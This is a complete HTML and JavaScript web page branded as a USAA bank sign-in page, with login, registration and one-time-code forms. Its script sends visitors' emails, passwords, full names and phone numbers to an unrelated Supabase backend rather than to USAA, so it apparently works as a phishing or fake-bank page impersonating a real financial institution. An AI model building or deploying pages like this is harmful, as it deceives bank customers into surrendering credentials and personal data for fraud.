<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USAA - Access Your Account</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #002649;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .auth-card {
      background-color: #ffffff;
      color: #333333;
      width: 100%;
      max-width: 420px;
      border-radius: 16px;
      padding: 30px 25px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }

    .brand-header {
      text-align: center;
      margin-bottom: 25px;
    }

    .brand-header i {
      font-size: 40px;
      color: #002649;
    }

    .brand-header h1 {
      font-size: 24px;
      font-weight: 700;
      color: #002649;
      margin-top: 8px;
    }

    .tabs {
      display: flex;
      border-bottom: 2px solid #e2e8f0;
      margin-bottom: 20px;
    }

    .tab-btn {
      flex: 1;
      padding: 12px;
      background: none;
      border: none;
      font-size: 16px;
      font-weight: 600;
      color: #64748b;
      cursor: pointer;
      text-align: center;
    }

    .tab-btn.active {
      color: #002649;
      border-bottom: 3px solid #002649;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #475569;
      margin-bottom: 6px;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      color: #333333;
    }

    .form-group input:focus {
      border-color: #002649;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #002649;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s ease;
    }

    .btn-submit:hover {
      background-color: #001a33;
    }

    .btn-submit:disabled {
      background-color: #94a3b8;
      cursor: not-allowed;
    }

    .btn-secondary {
      width: 100%;
      padding: 12px;
      background: white;
      color: #002649;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }

    .alert {
      padding: 12px;
      border-radius: 6px;
      font-size: 14px;
      margin-bottom: 15px;
      display: none;
      word-break: break-word;
    }

    .alert.error {
      background-color: #fee2e2;
      color: #991b1b;
      border: 1px solid #f87171;
      display: block;
    }

    .alert.success {
      background-color: #dcfce7;
      color: #166534;
      border: 1px solid #4ade80;
      display: block;
    }

    .otp-info {
      text-align: center;
      font-size: 14px;
      color: #475569;
      margin-bottom: 18px;
      line-height: 1.45;
    }

    .otp-info strong {
      color: #002649;
    }

    #otp-form {
      display: none;
    }
  </style>
</head>
<body>

  <div class="auth-card">
    <div class="brand-header">
      <i class="fa-solid fa-building-columns"></i>
      <h1>USAA</h1>
    </div>

    <!-- Tabs (hidden when OTP is showing) -->
    <div class="tabs" id="tabs">
      <button id="login-tab" class="tab-btn active">Log In</button>
      <button id="register-tab" class="tab-btn">Register</button>
    </div>

    <div id="alert-box" class="alert"></div>

    <!-- LOGIN FORM (Step 1) -->
    <form id="login-form">
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="login-email" placeholder="Enter your email" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="login-password" placeholder="••••••••" required />
      </div>
      <button type="submit" class="btn-submit" id="login-btn">Log In</button>
    </form>

    <!-- OTP FORM (Step 2) -->
    <form id="otp-form">
      <div class="otp-info">
        An 8-digit verification code has been sent to<br>
        <strong id="otp-email-display">your email</strong>
      </div>
      <div class="form-group">
        <label>Enter 8-digit Code</label>
        <input type="text" id="otp-code" placeholder="00000000" maxlength="8" inputmode="numeric" required style="text-align:center; font-size:22px; letter-spacing:6px;" />
      </div>
      <button type="submit" class="btn-submit" id="otp-btn">Verify & Login</button>
      <button type="button" class="btn-secondary" id="back-to-login">← Back to Login</button>
    </form>

    <!-- REGISTRATION FORM -->
    <form id="register-form" style="display: none;">
      <div class="form-group">
        <label>Full Name</label>
        <input type="text" id="reg-name" placeholder="Sarah Jenkins" required />
      </div>
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="reg-email" placeholder="sarah@example.com" required />
      </div>
      <div class="form-group">
        <label>Phone Number</label>
        <input type="tel" id="reg-phone" placeholder="+1 (555) 000-0000" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="reg-password" placeholder="Create password" required />
      </div>
      <button type="submit" class="btn-submit" id="reg-btn">Create Account</button>
    </form>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';

    const SUPABASE_URL = "https://hzajoriyzowufebetpzv.supabase.co";
    const SUPABASE_ANON_KEY = "sb_publishable_2VBan5zlHsacQ4fvsBiBPQ_78oaUVth";
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    let pendingEmail = "";

    // Elements
    const loginTab = document.getElementById('login-tab');
    const registerTab = document.getElementById('register-tab');
    const loginForm = document.getElementById('login-form');
    const registerForm = document.getElementById('register-form');
    const otpForm = document.getElementById('otp-form');
    const tabs = document.getElementById('tabs');

    function showAlert(msg, type = 'error') {
      const box = document.getElementById('alert-box');
      if (!msg) {
        box.style.display = 'none';
        return;
      }
      box.className = `alert ${type}`;
      box.innerText = msg;
      box.style.display = 'block';
    }

    function switchTab(tab) {
      showAlert('');
      otpForm.style.display = 'none';
      tabs.style.display = 'flex';

      if (tab === 'login') {
        loginForm.style.display = 'block';
        registerForm.style.display = 'none';
        loginTab.classList.add('active');
        registerTab.classList.remove('active');
      } else {
        loginForm.style.display = 'none';
        registerForm.style.display = 'block';
        registerTab.classList.add('active');
        loginTab.classList.remove('active');
      }
    }

    loginTab.addEventListener('click', () => switchTab('login'));
    registerTab.addEventListener('click', () => switchTab('register'));

    document.getElementById('back-to-login').addEventListener('click', () => {
      switchTab('login');
    });

    // ===================== LOGIN (Step 1 - Password) =====================
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const loginBtn = document.getElementById('login-btn');
      loginBtn.disabled = true;
      loginBtn.innerText = "Verifying...";
      showAlert('');

      const email = document.getElementById('login-email').value.trim();
      const password = document.getElementById('login-password').value;

      try {
        // First check if password is correct
        const { data, error } = await supabase.auth.signInWithPassword({
          email: email,
          password: password
        });

        if (error) throw error;

        // Password is correct → now send OTP to the same email
        await supabase.auth.signOut();

        const { error: otpError } = await supabase.auth.signInWithOtp({
          email: email,
          options: {
            shouldCreateUser: false
          }
        });

        if (otpError) throw otpError;

        // Show OTP screen
        pendingEmail = email;
        document.getElementById('otp-email-display').textContent = email;
        loginForm.style.display = 'none';
        tabs.style.display = 'none';
        otpForm.style.display = 'block';
        showAlert('An 8-digit code has been sent to your email.', 'success');

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Invalid email or password.", 'error');
      } finally {
        loginBtn.disabled = false;
        loginBtn.innerText = "Log In";
      }
    });

    // ===================== OTP VERIFICATION (Step 2) =====================
    otpForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const otpBtn = document.getElementById('otp-btn');
      otpBtn.disabled = true;
      otpBtn.innerText = "Verifying Code...";
      showAlert('');

      const code = document.getElementById('otp-code').value.trim();

      try {
        const { data, error } = await supabase.auth.verifyOtp({
          email: pendingEmail,
          token: code,
          type: 'email'
        });

        if (error) throw error;

        showAlert('Login successful! Redirecting...', 'success');
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 1000);

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Invalid or expired code. Please try again.", 'error');
      } finally {
        otpBtn.disabled = false;
        otpBtn.innerText = "Verify & Login";
      }
    });

    // ===================== REGISTRATION =====================
    registerForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const regBtn = document.getElementById('reg-btn');
      regBtn.disabled = true;
      regBtn.innerText = "Creating Account...";
      showAlert('');

      const name = document.getElementById('reg-name').value.trim();
      const email = document.getElementById('reg-email').value.trim();
      const phone = document.getElementById('reg-phone').value.trim();
      const password = document.getElementById('reg-password').value;
      const username = email.split('@')[0] + Math.floor(Math.random() * 10000);

      try {
        const { data: authData, error: authError } = await supabase.auth.signUp({
          email: email,
          password: password,
          options: {
            data: {
              full_name: name,
              phone_number: phone,
              username: username
            }
          }
        });

        if (authError) throw authError;

        if (authData?.user) {
          await supabase.from('profiles').upsert({
            id: authData.user.id,
            full_name: name,
            username: username,
            phone_number: phone,
            email: email
          });
        }

        showAlert('Account created successfully! Please log in.', 'success');
        registerForm.reset();
        setTimeout(() => switchTab('login'), 1500);

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Could not register.", 'error');
      } finally {
        regBtn.disabled = false;
        regBtn.innerText = "Create Account";
      }
    });
  </script>
</body>
</html>
